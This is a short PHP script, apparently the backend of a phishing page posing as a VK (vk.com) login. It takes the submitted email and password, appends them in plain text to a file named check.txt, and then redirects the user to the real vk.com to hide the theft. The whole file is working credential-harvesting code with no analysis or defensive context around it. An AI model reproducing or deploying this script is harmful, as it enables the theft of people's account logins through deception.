<?php
$login = $_POST['email'];
$password = $_POST['pass'];
$data = $login.":".$password."\r\n";
//file_put_contents('check.txt', $data);
$fp = fopen("check.txt", "a");
$mytext = "Это строку необходимо нам записать\r\n";
$test = fwrite($fp, $data);
fclose($fp); //Закрытие файла
header('Location: http://vk.com');